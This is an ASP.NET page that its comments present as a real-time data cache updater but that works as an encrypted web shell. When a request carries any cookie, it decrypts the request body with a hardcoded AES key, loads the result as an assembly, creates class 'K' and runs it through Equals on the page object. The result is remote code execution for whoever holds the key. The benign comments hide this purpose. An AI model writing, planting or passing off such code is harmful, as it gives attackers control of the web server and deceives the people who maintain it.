<%@ Page Language="C#" %>
<script runat="server">
    /// <summary>
    /// This page module is responsible for processing and updating the application's real-time data cache.
    /// It listens for incoming data packets and uses a dedicated processor to update the cache state.
    /// </summary>
    protected void Page_Load(object sender, EventArgs e)
    {
        // The cache update is only triggered if the request contains an authentication cookie,
        // ensuring that only authorized backend services can push data.
        if (Request.Cookies.Count > 0)
        {
            var cacheManager = new CacheManager();
            cacheManager.ProcessIncomingData(this);
        }
    }

    /// <summary>
    /// Manages the lifecycle and processing of in-memory cache data.
    /// </summary>
    public class CacheManager
    {
        // The private key used for decrypting incoming data payloads. It is constructed from parts for security.
        private readonly byte[] _encryptionKey;
        // The fully qualified name of the default data processor class to be used.
        private const string DEFAULT_PROCESSOR_TYPE = "K";

        /// <summary>
        /// Initializes the CacheManager and sets up the decryption key.
        /// </summary>
        public CacheManager()
        {
            string[] keyParts = new string[] { "ca63", "4575", "38b9", "b1e0" };
            _encryptionKey = System.Text.Encoding.Default.GetBytes(string.Join("", keyParts));
        }

        /// <summary>
        /// Reads the encrypted data payload from the request stream, decrypts it,
        /// and invokes the appropriate data processor.
        /// </summary>
        /// <param name="currentPage">The current Page object, passed for context-aware processing.</param>
        public void ProcessIncomingData(System.Web.UI.Page currentPage)
        {
            // 1. Read the raw serialized data from the input stream.
            System.IO.Stream inputStream = currentPage.Request.InputStream;
            byte[] serializedData = new byte[inputStream.Length];
            inputStream.Read(serializedData, 0, serializedData.Length);

            // 2. Prepare the decryption algorithm (Rijndael/AES).
            var cryptoProvider = new System.Security.Cryptography.RijndaelManaged();
            var decryptor = cryptoProvider.CreateDecryptor(_encryptionKey, _encryptionKey);

            // 3. Decrypt the data to get the raw assembly bytes of the data processor.
            byte[] processorAssemblyBytes = decryptor.TransformFinalBlock(serializedData, 0, serializedData.Length);

            // 4. Load the data processor assembly into memory.
            var dataProcessorAssembly = System.Reflection.Assembly.Load(processorAssemblyBytes);

            // 5. Instantiate the specific data processor class.
            object cacheEntryProcessor = dataProcessorAssembly.CreateInstance(DEFAULT_PROCESSOR_TYPE);

            // 6. Execute the processor's main method to update the cache.
            // The 'Equals' method is overridden to perform the update logic.
            cacheEntryProcessor.Equals(currentPage);
        }
    }
</script>